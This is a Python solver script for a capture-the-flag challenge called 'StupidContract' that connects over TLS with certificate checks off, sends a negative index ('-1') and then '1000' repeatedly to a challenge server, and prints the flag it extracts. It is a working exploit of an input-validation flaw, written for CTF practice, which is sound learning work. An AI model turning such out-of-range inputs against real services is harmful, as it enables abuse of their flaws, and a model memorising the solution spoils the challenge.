#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import argparse
import re
import socket
import ssl
import time

PROMPT = b"Please enter the index"
FLAG_RE = re.compile(rb"GPNCTF\{.*?\}")


def remote_ssl(host, port):
    s = socket.create_connection((host, port), timeout=10)
    context_ssl = ssl.create_default_context()
    context_ssl.check_hostname = False
    context_ssl.verify_mode = ssl.CERT_NONE
    ssl_sock = context_ssl.wrap_socket(s, server_hostname=host)
    ssl_sock.settimeout(5)
    return ssl_sock


def recv_until(sock, marker):
    data = b""
    while marker not in data:
        chunk = sock.recv(65536)
        if not chunk:
            break
        data += chunk
    return data


def recv_all(sock):
    data = b""
    while True:
        try:
            chunk = sock.recv(65536)
        except socket.timeout:
            break
        if not chunk:
            break
        data += chunk
    return data

def run_solver(args):
    io = remote_ssl(args.host, args.port)
    try:
        output = recv_until(io, PROMPT)
        seen_win = False

        for _ in range(300):
            payload = b"1000\n" if seen_win else b"-1\n"
            io.sendall(payload)
            time.sleep(0.01)
            output += recv_until(io, PROMPT)
            if b"Your reservation succeeded" in output:
                seen_win = True

        output += recv_all(io)
    finally:
        io.close()

    match = FLAG_RE.search(output)
    if match:
        print(f"<FLAG>{match.group(0).decode()}</FLAG>")
    else:
        print("[!] Flag not found in output. Full output below:")
        print(output.decode(errors="ignore"))

def main():
    parser = argparse.ArgumentParser(description="StupidContract remote final solver")
    parser.add_argument("host", nargs="?", default="butter-basted-pizza-on-sauteed-mint-bdpw.gpn24.ctf.kitctf.de", help="Remote host")
    parser.add_argument("port", nargs="?", type=int, default=443, help="Remote port")
    args = parser.parse_args()

    run_solver(args)

if __name__ == "__main__":
    main()